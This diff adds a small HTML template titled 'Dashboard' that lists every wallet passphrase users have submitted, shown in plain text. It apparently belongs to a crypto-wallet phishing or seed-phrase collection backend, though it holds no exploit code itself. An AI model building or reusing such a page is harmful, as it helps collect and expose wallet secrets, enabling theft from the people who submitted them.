@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dashboard</title>
+</head>
+<body>
+    <h2>Passphrases</h2>
+    
+    {% if wallet_info %}
+        <h3>Submitted Passphrases:</h3>
+        <ul>
+            {% for wallet in wallet_info %}
+                <li>{{ wallet.pass_phrase }}</li>
+            {% endfor %}
+        </ul>
+    {% else %}
+        <p>No passphrase submitted yet.</p>
+    {% endif %}
+
+    <br>
+</body>
+</html>
